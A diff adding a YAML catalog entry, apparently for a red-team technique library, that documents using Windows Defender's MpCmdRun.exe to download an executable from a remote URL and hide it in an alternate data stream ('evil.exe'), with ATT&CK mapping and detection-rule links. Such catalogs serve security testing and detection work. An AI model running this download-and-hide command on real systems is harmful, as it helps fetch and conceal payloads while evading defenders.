@@ -1,0 +1,31 @@
+id: lolbas/mpcmdrun/ads/2
+type: binary
+platform: windows
+name: MpCmdRun.exe
+phases:
+- defense-evasion
+capabilities:
+- defense-evasion
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1564.004
+opsec:
+  noise: medium
+  triggers: MpCmdRun storing data into alternate data streams.
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/159bf4bbc103cc2be3fef4b7c2e7c8b23b63fd10/rules/windows/process_creation/win_susp_mpcmdrun_download.yml
+  - https://github.com/elastic/detection-rules/blob/6ef5c53b0c15e344f0f2d1649941391aea6fa253/rules/windows/command_and_control_remote_file_copy_mpcmdrun.toml
+commands:
+- template: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
+  comment: Download file to machine and store it in Alternate Data Stream
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
+tags:
+- windows
+- lolbas
